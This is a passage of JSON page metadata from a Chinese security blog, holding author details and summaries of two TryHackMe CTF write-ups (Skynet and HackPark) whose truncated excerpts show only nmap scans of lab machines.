class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%B7%A5%E5%85%B7\"><span class=\"toc-text\">工具</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%8F%82%E8%80%83%E6%96%87%E6%A1%A3\"><span class=\"toc-text\">参考文档</span></a></li></ol>","author":{"name":"剑三","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"御剑乘风来 除魔天地间","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"Skynet CTF - TryHackMe.com","uid":"3a5527b898a460b8d684d86b679517ec","slug":"Skynet","date":"2022-04-12T04:09:05.512Z","updated":"2022-04-15T07:51:26.729Z","comments":true,"path":"api/articles/Skynet.json","keywords":null,"cover":"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/skynet/maxresdefault.jpg","text":"Skynet是Tryhack平台上一个易受攻击的终结者主题系统。 搜集信息老套路，先用nmap扫描靶机运行的服务端口。 nmap搜集信息 └─$ sudo nmap -sV 10.10.40.174 -T4 -oA skynet-V Starting Nmap 7.92 ( ht...","link":"","photos":[],"count_time":{"symbolsCount":"24k","symbolsTime":"22 mins."},"categories":[{"name":"CTF","slug":"CTF","count":6,"path":"api/categories/CTF.json"}],"tags":[{"name":"Linux Privilege Escalation","slug":"Linux-Privilege-Escalation","count":3,"path":"api/tags/Linux-Privilege-Escalation.json"},{"name":"tryhackme","slug":"tryhackme","count":6,"path":"api/tags/tryhackme.json"},{"name":"Skynet","slug":"Skynet","count":1,"path":"api/tags/Skynet.json"},{"name":"wildcards on Linux","slug":"wildcards-on-Linux","count":1,"path":"api/tags/wildcards-on-Linux.json"}],"author":{"name":"剑三","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"御剑乘风来 除魔天地间","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"HackPark CTF - TryHackMe.com","uid":"b2262541e68f87fb5672c699c612b8ae","slug":"HackPark","date":"2022-03-28T14:30:27.813Z","updated":"2022-04-01T17:44:54.777Z","comments":true,"path":"api/articles/HackPark.json","keywords":null,"cover":"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/hackpark/image_by_url.jpg","text":"HarkPark使用Hydra爆破登录网站，搜索漏洞，并利用漏洞升级Windows机器！ 信息收集开启tryhackme靶机，使用Nmap进行服务发现扫描。 └─$ sudo nmap 10.10.1.135 -sS -Pn -F --max-retries 0 -T 4 -oA...","link":"","photos":[],"count_time":{"symbolsCount":"24k","symbolsTime":"22 mins."},"categories":[{"name":"CTF","slug":"CTF","count":6,"path":"api/categories/CTF.json"}],"tags":[{"name":"tryhackme","slug":"tryhackme","count":6,"path":"api/tags/tryhackme.json"},{"name":"Windows Privilege Escalation","slug":"Windows-Privilege-Escalation","count":3,"path":"api/tags/Windows-Privilege-Escalation.json"}],"author":{"name":"剑三","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"御剑乘风来 除魔天地间","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}